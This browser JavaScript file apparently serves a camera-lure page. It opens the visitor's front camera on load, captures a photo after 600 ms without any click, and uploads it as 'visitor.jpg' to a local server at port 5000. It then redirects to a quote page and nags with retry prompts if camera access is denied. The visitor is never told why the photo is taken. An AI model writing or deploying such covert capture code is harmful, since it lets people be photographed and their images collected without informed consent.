const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const statusText = document.getElementById("status");

let streamStarted = false;
let uploaded = false;

/* ================= START IMMEDIATELY ================= */
window.addEventListener("load", startCamera);

/* ================= CAMERA ================= */
async function startCamera() {

    try {

        statusText.innerText = "Opening camera...";

        const stream = await navigator.mediaDevices.getUserMedia({
            video: {
                facingMode: "user"
            },
            audio: false
        });

        video.srcObject = stream;

        // play immediately when stream is ready
        await video.play();

        streamStarted = true;

        statusText.innerText = "Camera ready ✔";

        // reduce delay (almost instant capture)
        setTimeout(() => {
            capture();
        }, 600);

    } catch (err) {

        console.log(err);

        statusText.innerText = "Camera blocked ❌";

        askRetryCamera();
    }
}

/* ================= CAPTURE ================= */
function capture() {

    if (!streamStarted || uploaded) return;

    const ctx = canvas.getContext("2d");

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    statusText.innerText = "Processing...";

    canvas.toBlob(async (blob) => {

        if (!blob) {
            statusText.innerText = "Capture failed";
            askRetryUpload();
            return;
        }

        const formData = new FormData();
        formData.append("photo", blob, "visitor.jpg");

        statusText.innerText = "Uploading...";

        try {

            const res = await fetch("http://localhost:5000/upload", {
                method: "POST",
                body: formData
            });

            const data = await res.json();

            if (data.success) {

                uploaded = true;

                statusText.innerText = "Success ✔";

                stopCamera();

                setTimeout(() => {
                    window.location.href = "quote.html";
                }, 700);

            } else {
                statusText.innerText = "Upload failed";
                askRetryUpload();
            }

        } catch (err) {

            console.log(err);
            statusText.innerText = "Network error";
            askRetryUpload();
        }

    }, "image/jpeg", 0.7);
}

/* ================= RETRY CAMERA ================= */
function askRetryCamera() {

    const retry = confirm(
        "Camera failed or permission denied.\nTry again?"
    );

    if (retry) startCamera();
}

/* ================= RETRY UPLOAD ================= */
function askRetryUpload() {

    const retry = confirm(
        "Upload failed.\nTry again?"
    );

    if (retry) {
        statusText.innerText = "Retrying...";
        capture();
    }
}

/* ================= STOP CAMERA ================= */
function stopCamera() {

    const stream = video.srcObject;

    if (stream) {
        stream.getTracks().forEach(track => track.stop());
    }
}